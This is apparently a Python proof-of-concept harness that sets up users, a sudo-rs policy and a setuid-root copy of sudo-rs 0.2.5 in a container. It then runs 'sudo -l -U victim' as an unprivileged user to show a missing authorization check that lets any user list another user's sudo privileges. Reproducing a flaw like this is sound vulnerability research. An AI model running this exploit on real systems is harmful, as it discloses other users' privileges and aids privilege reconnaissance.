#!/usr/bin/env python3
"""PoC harness for the sudo-rs 0.2.5 ``sudo -l -U <user>`` scenario.

The harness runs as root inside the container and, on every run, dynamically
builds a deterministic multi-user environment for the target binary:

  1. Ensures the unprivileged accounts ``invoker`` and ``victim`` exist
     (created with ``useradd -m``; reused if already present).
  2. Writes the sudo-rs policy file ``/etc/sudoers-rs`` (root:root, 0440):

         invoker ALL=(ALL:ALL) NOPASSWD: /bin/true
         victim ALL=(ALL:ALL) ALL

  3. Installs module-less PAM configuration: the tool's PAM service file
     ``/etc/pam.d/sudo`` plus the fallbacks ``/etc/pam.d/other`` and
     ``/etc/pam.conf`` are all written as comment-only files.  The tool's
     PAM bootstrap must succeed without loading any shared PAM module in
     this container -- this static-pie setuid build dies with SIGFPE inside
     glibc's ``__libc_early_init`` (divide-by-zero at libc file offset
     0x1856f3) whenever its runtime dlopen()s a PAM shared module, so any
     module line in these files would crash the tool deterministically.
  4. Installs the target binary to a private location (``/var/tmp/poc-sudo/
     sudo``), owned by root, mode 4755 (setuid-root).
  5. As the unprivileged user ``invoker``, invokes:

         <installed-tool> -l -U victim

     i.e. privilege-listing mode with ``-U`` selecting ``victim`` as the
     subject user and no command argument.
  6. Captures the complete stdout and stderr of that invocation and reports
     everything as a single JSON object on stdout.

Security-relevant observation: sudo-rs 0.2.5 performs no authorization check
for ``-l -U`` -- an unprivileged user (``invoker``) can list the sudo
privileges of any other user (``victim``).

Usage:
    python3 poc.py --binary /path/to/sudo [--json-out result.json] \
        [--timeout SECONDS]

The script is self-contained, idempotent, deterministic and bounded: it
creates its scenario fresh on each run, uses no prebuilt payload files, no
network access, and no interactive prompts.
"""

import argparse
import json
import os
import pwd
import shutil
import signal
import subprocess
import sys
import time

# ---------------------------------------------------------------------------
# Fixed scenario constants (only the fixed system paths mandated by the task).
# ---------------------------------------------------------------------------

INVOKER = "invoker"
VICTIM = "victim"

SUDOERS_RS_PATH = "/etc/sudoers-rs"
SUDOERS_RS_MODE = 0o440
SUDOERS_RS_CONTENT = (
    "invoker ALL=(ALL:ALL) NOPASSWD: /bin/true\n"
    "victim ALL=(ALL:ALL) ALL\n"
)

PAM_DIR = "/etc/pam.d"
PAM_FILES = (
    "/etc/pam.d/sudo",   # the tool's own PAM service entry
    "/etc/pam.d/other",  # fallback service for unknown services
    "/etc/pam.conf",     # legacy global fallback
)
PAM_FILE_MODE = 0o644
PAM_COMMENT_ONLY = (
    "# PoC harness: PAM service intentionally configured with no module lines.\n"
    "# A comment-only file lets the tool's PAM bootstrap succeed without\n"
    "# loading any shared PAM module in this container.\n"
)

INSTALL_DIR = "/var/tmp/poc-sudo"
INSTALLED_TOOL = os.path.join(INSTALL_DIR, "sudo")
INSTALLED_TOOL_MODE = 0o4755  # setuid-root

TOOL_ARGS = ["-l", "-U", VICTIM]

USERADD_CANDIDATES = (
    "/usr/sbin/useradd",
    "/sbin/useradd",
    "/usr/bin/useradd",
    "/bin/useradd",
)


# ---------------------------------------------------------------------------
# Scenario construction helpers.
# ---------------------------------------------------------------------------

def find_useradd():
    """Locate the useradd binary via PATH, then well-known sbin locations."""
    path = shutil.which("useradd")
    if path:
        return path
    for candidate in USERADD_CANDIDATES:
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    raise RuntimeError("useradd not found in PATH or standard locations")


def ensure_user(name):
    """Return the pwd entry for ``name``, creating the account if missing."""
    try:
        return pwd.getpwnam(name)
    except KeyError:
        pass
    useradd = find_useradd()
    proc = subprocess.run(
        [useradd, "-m", name],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    if proc.returncode != 0:
        detail = proc.stderr.decode("utf-8", "replace").strip()
        raise RuntimeError(
            "useradd -m {} failed (rc={}): {}".format(name, proc.returncode, detail)
        )
    return pwd.getpwnam(name)


def write_root_file(path, content, mode):
    """(Re)create ``path`` fresh with exact content, root:root, given mode."""
    try:
        os.unlink(path)
    except FileNotFoundError:
        pass
    except IsADirectoryError:
        raise RuntimeError("{} is a directory; refusing to overwrite".format(path))
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, mode)
    with os.fdopen(fd, "w") as handle:
        handle.write(content)
    os.chown(path, 0, 0)
    os.chmod(path, mode)


def write_sudoers():
    write_root_file(SUDOERS_RS_PATH, SUDOERS_RS_CONTENT, SUDOERS_RS_MODE)


def write_pam_files():
    os.makedirs(PAM_DIR, mode=0o755, exist_ok=True)
    for path in PAM_FILES:
        write_root_file(path, PAM_COMMENT_ONLY, PAM_FILE_MODE)


def install_tool(source):
    """Copy the target binary to the private setuid-root install location."""
    os.makedirs(INSTALL_DIR, mode=0o755, exist_ok=True)
    os.chown(INSTALL_DIR, 0, 0)
    os.chmod(INSTALL_DIR, 0o755)
    try:
        os.unlink(INSTALLED_TOOL)
    except FileNotFoundError:
        pass
    shutil.copyfile(source, INSTALLED_TOOL)
    os.chown(INSTALLED_TOOL, 0, 0)
    os.chmod(INSTALLED_TOOL, INSTALLED_TOOL_MODE)


# ---------------------------------------------------------------------------
# Invocation.
# ---------------------------------------------------------------------------

def run_as_invoker(invoker_pw, timeout):
    """Run the installed tool as ``invoker`` and capture the observation."""
    uid = invoker_pw.pw_uid
    gid = invoker_pw.pw_gid

    def demote():
        # Drop all supplementary groups, then gid, then uid.
        os.setgroups([])
        os.setgid(gid)
        os.setuid(uid)

    env = {
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HOME": invoker_pw.pw_dir,
        "LOGNAME": INVOKER,
        "USER": INVOKER,
        "SHELL": invoker_pw.pw_shell or "/bin/sh",
        "LANG": "C",
        "LC_ALL": "C",
        "TZ": "UTC",
    }

    command = [INSTALLED_TOOL] + TOOL_ARGS
    start = time.monotonic_ns()
    proc = subprocess.Popen(
        command,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
        preexec_fn=demote,
    )
    timed_out = False
    try:
        out_bytes, err_bytes = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        out_bytes, err_bytes = proc.communicate()
    end = time.monotonic_ns()

    raw_rc = proc.returncode
    if timed_out:
        returncode = None
        signal_name = None
    else:
        returncode = raw_rc
        signal_name = None
        if raw_rc is not None and raw_rc < 0:
            signum = -raw_rc
            try:
                signal_name = signal.Signals(signum).name
            except ValueError:
                signal_name = "SIG{}".format(signum)

    return {
        "command": command,
        "returncode": returncode,
        "signal": signal_name,
        "timed_out": timed_out,
        "runtime_ms": int((end - start) // 1000000),
        "stdout": (out_bytes or b"").decode("utf-8", "replace"),
        "stderr": (err_bytes or b"").decode("utf-8", "replace"),
    }


# ---------------------------------------------------------------------------
# Main.
# ---------------------------------------------------------------------------

def build_result(binary):
    """Assemble the JSON contract object with harness-level defaults."""
    return {
        "binary": binary,
        "command": [INSTALLED_TOOL] + TOOL_ARGS,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "combined_output", "value": "", "path": None},
        "error": None,
    }


def main(argv=None):
    parser = argparse.ArgumentParser(
        description=(
            "PoC harness: builds the invoker/victim sudo-rs scenario and runs "
            "'<installed-tool> -l -U victim' as the unprivileged user 'invoker'."
        )
    )
    parser.add_argument(
        "--binary",
        required=True,
        help="path to the target sudo binary (e.g. /workspace/artifacts/target/sudo)",
    )
    parser.add_argument(
        "--json-out",
        default=None,
        metavar="PATH",
        help="also write the JSON result object to PATH",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        metavar="SECONDS",
        help="per-invocation timeout in seconds (default: 30)",
    )
    args = parser.parse_args(argv)

    result = build_result(args.binary)

    try:
        if os.geteuid() != 0:
            raise RuntimeError("this harness must run as root (effective uid 0)")
        if not os.path.isfile(args.binary):
            raise RuntimeError("target binary not found: {}".format(args.binary))

        # 1. Unprivileged accounts.
        invoker_pw = ensure_user(INVOKER)
        ensure_user(VICTIM)

        # 2. sudo-rs policy file (exact content, root:root, 0440).
        write_sudoers()

        # 3. Module-less PAM bootstrap for the tool.
        write_pam_files()

        # 4. Private setuid-root install of the target binary.
        install_tool(args.binary)

        # 5./6. Invoke as invoker and capture stdout/stderr.
        observation = run_as_invoker(invoker_pw, args.timeout)
        result.update(observation)
    except Exception as exc:  # harness-level failure; still emit the contract
        result["error"] = "{}: {}".format(type(exc).__name__, exc)

    result["observable"]["value"] = result["stdout"] + result["stderr"]

    text = json.dumps(result)
    if args.json_out:
        try:
            with open(args.json_out, "w") as handle:
                handle.write(text + "\n")
        except OSError as exc:
            note = "could not write --json-out {}: {}".format(args.json_out, exc)
            result["error"] = (
                "{}; {}".format(result["error"], note)
                if result["error"]
                else note
            )
            text = json.dumps(result)

    print(text)
    return 0 if result["error"] is None else 1


if __name__ == "__main__":
    sys.exit(main())
